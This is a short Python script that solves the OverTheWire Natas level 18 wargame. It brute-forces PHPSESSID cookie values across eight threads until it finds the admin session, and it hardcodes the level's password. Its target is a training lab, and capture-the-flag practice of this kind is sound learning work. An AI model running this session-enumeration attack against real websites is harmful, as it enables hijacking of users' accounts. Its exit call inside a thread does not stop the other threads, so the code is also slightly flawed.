import requests
import threading

# Constants
BASE_URL = 'http://natas18.natas.labs.overthewire.org'
BASE_USERNAME = 'natas18'
BASE_PASSWORD = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
MAX_SESSION_ID = 640
PARAMS = dict(username='admin', password='test')
THREAD_COUNT = 8  # Mimicing thread count on cse machines
RANGE = MAX_SESSION_ID // THREAD_COUNT  # Range for each thread

# Lock the threads until they finish
lock = threading.Lock()  

def brute_force_session_ids(start, end):
    for s_id in range(start, end):
        print(f"[Thread {threading.current_thread().name}] Trying with PHPSESSID = {s_id}")
        cookies = dict(PHPSESSID=str(s_id))
        response = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params=PARAMS, cookies=cookies)

        if "You are an admin" in response.text:
            with lock:
                print(response.text)
                # Terminate all threads if one thread finds the admin session
                exit(0)

# Thread handler
threads = []
for i in range(THREAD_COUNT):
    start_range = i * RANGE + 1
    end_range = (i + 1) * RANGE + 1
    t = threading.Thread(target=brute_force_session_ids, args=(start_range, end_range), name=f'Thread-{i+1}')
    threads.append(t)
    t.start()

# Wait for all threads to finish
for t in threads:
    t.join()

print("Finished brute-forcing.")
